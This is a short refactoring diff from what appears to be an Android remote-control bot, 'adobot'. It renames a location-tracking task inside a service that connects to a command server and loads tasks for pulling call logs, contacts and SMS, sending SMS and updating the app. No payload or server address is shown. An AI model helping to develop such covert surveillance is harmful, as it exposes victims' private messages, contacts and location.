@@ -1,14 +1,8 @@
 package com.android.adobot;
 
-import android.Manifest;
 import android.app.Service;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.location.Location;
-import android.location.LocationListener;
-import android.os.Bundle;
 import android.os.IBinder;
-import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -20,8 +14,7 @@ import java.util.HashMap;
 
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
-import io.nlopez.smartlocation.OnLocationUpdatedListener;
-import io.nlopez.smartlocation.SmartLocation;
+
 import io.socket.client.Ack;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -29,7 +22,7 @@ import io.socket.emitter.Emitter;
 import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
-import com.android.adobot.tasks.LocationTask;
+import com.android.adobot.tasks.LocationMonitorTask;
 import com.android.adobot.tasks.SendSmsTask;
 import com.android.adobot.tasks.TransferBotTask;
 import com.android.adobot.tasks.UpdateAppTask;
@@ -39,7 +32,7 @@ public class CommandService extends Service {
 
     private static final String TAG = "CommandService";
 
-    private LocationTask locationTask;
+    private LocationMonitorTask locationTask;
     private CommonParams params;
     private CommandService client;
     private Socket socket;
@@ -60,7 +53,7 @@ public class CommandService extends Service {
         client = this;
         connected = false;
         createSocket(params.getServer());
-        locationTask = new LocationTask(this);
+        locationTask = new LocationMonitorTask(this);
         locationTask.start();
 
     }
